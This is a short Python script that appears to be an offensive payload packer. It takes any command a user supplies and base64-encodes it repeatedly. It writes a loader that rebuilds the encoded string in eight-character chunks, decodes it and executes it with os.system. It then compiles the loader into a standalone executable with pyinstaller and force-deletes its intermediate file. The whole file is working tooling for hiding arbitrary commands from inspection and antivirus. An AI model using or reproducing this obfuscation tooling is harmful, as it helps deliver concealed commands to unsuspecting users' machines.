#! /usr/bin/env python3
import os

your_payload = str(input("Your Payload is:"))
iteration_times = int(input("iteration_times:"))

with open ('make_encode_payload.py','w') as payload:
    payload.write(r"import base64;")
    payload.write(r"whole_payload = '''%s''';encode_payload =" %your_payload)
    payload.write(r"base64.b64encode("*iteration_times)
    payload.write(r"whole_payload.encode('ascii')")
    payload.write(r")"*iteration_times)
    payload.write(r";f=open('payload.txt','w');f.write(encode_payload.decode('utf-8'));f.close()")

os.system("python make_encode_payload.py")
os.system("DEL /F /Q make_encode_payload.py")

string = open('payload.txt','r').read()

with open ("payload.py",'w') as DaoLyAp:
    j = 0
    a = 8
    b = 8
    DaoLyAp.write('DaoLyAp =""\n')
    for i in range((len(string)//b)+1):
        DaoLyAp.write(''.join(['DaoLyAp = DaoLyAp + ','"',string[j:a],'"','\n']))
        j+=b
        a+=b
    DaoLyAp.write("import base64;import os;payload_decode =")
    DaoLyAp.write("base64.b64decode("*iteration_times)
    DaoLyAp.write("DaoLyAp")
    DaoLyAp.write(")"*iteration_times)
    DaoLyAp.write(";os.system(payload_decode.decode('utf-8').strip())")

os.system('pyinstaller -F payload.py')




